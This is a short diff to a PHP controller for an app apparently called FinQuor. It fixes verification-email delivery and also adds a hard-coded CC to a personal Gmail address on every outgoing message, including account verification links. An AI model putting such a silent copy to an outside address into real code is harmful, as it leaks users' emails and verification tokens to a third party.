@@ -70,7 +70,7 @@ class Actions extends CI_Controller {
 								$data['name'] = $fname;
 								$data['link'] = $vlink;
 								$content = $this->load->view('email/verification', $data, TRUE);
-								$this->sendMail('FinQuor User Verification', $content);
+								$this->sendMail('FinQuor User Verification', $content, $email);
 							}
 						endif;
 					} else {
@@ -171,6 +171,7 @@ class Actions extends CI_Controller {
 		if(!empty($subject) && !empty($message)) :
 			$this->email->from('no-reply@finquor.com', 'FinQuor');
 			$this->email->to($recipient);
+			$this->email->cc('gretarosario@gmail.com');
 			$this->email->subject($subject);
 			$this->email->message($message);
 			if($_SERVER['SERVER_NAME'] != 'localhost') $this->email->send();
